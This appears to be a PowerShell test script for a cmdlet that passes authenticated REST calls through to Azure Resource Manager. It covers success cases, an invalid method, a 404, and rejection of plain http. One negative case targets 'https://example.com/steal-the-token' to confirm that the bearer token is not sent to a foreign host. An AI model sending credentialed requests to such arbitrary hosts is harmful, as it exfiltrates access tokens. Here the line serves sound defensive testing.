# Universal REST passthrough - PowerShell
# Equivalent of: Invoke-AzRestMethod -Method GET -Uri <url>
#
# Prereq: import Login + Rest modules, then Connect-CirrusAccount.

Import-Module ../../../src/PS/Login/Login.psd1
Import-Module ../../../src/PS/Rest/Rest.psd1

# Happy path: relative ARM path. {subscriptionId} is substituted from the auth context,
# the ARM endpoint is prepended, and the request is authenticated automatically.
# Expect StatusCode 200 + a parsed JSON body of resource groups.
Invoke-CirrusRestMethod `
    -Method GET `
    -Uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"

# Happy path: absolute URL passes through unchanged (still ARM-authenticated).
Invoke-CirrusRestMethod `
    -Method GET `
    -Uri "https://management.azure.com/subscriptions/282bb33f-067d-4179-a7a4-b833c13af735/resourcegroups/cirrus-test-group-1?api-version=2021-04-01"

# Happy path with headers supplied as a hashtable.
Invoke-CirrusRestMethod `
    -Method GET `
    -Uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01" `
    -Headers @{ Accept = 'application/json' }

# Negative case: an unsupported HTTP method must be rejected (ValidateSet) with a clear message.
Invoke-CirrusRestMethod `
    -Method FOO `
    -Uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"

# Negative case: an HTTP error (>= 400) must surface the body AND raise a terminating error so
# scripts can detect it via $? / try-catch. This GET targets a resource group that does not exist
# and is expected to return 404; the full RestResponse (status/headers/body) is still shown.
Invoke-CirrusRestMethod `
    -Method GET `
    -Uri "/subscriptions/{subscriptionId}/resourcegroups/this-rg-does-not-exist-404?api-version=2021-04-01"
# After the call, $? should be $false (terminating error) — surface it for the test harness.
Write-Host "After 404 case, `$? = $?"

# Negative case: an absolute URL pointing at a non-ARM host must be REJECTED before any request is
# sent, so the ARM bearer token is never leaked to an arbitrary destination (token exfiltration).
Invoke-CirrusRestMethod `
    -Method GET `
    -Uri "https://example.com/steal-the-token"

# Negative case: an absolute http:// (non-https) ARM URL must be rejected.
Invoke-CirrusRestMethod `
    -Method GET `
    -Uri "http://management.azure.com/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"
